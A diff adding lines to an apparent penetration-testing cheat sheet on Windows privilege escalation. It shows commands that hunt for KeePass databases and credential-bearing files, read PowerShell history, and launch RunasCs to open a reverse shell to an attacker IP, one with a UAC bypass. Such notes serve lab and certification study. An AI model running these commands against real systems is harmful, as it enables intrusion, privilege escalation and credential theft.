@@ -1200,6 +1200,11 @@ Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyCont
 Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 
+
+.\RunasCs.exe <username> <password> cmd.exe -r <kali_ip>:<port>
+.\RunasCs.exe administrator admin@123 cmd.exe -r 192.168.1.1:1111
+.\RunasCs.exe admin admin@123 cmd.exe -r 192.168.1.1:1111 --bypass-uac
+    
 runas /user:backupadmin cmd
 (Get-PSReadlineOption).HistorySavePath
 type C:\\Users\\dave\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code></pre>
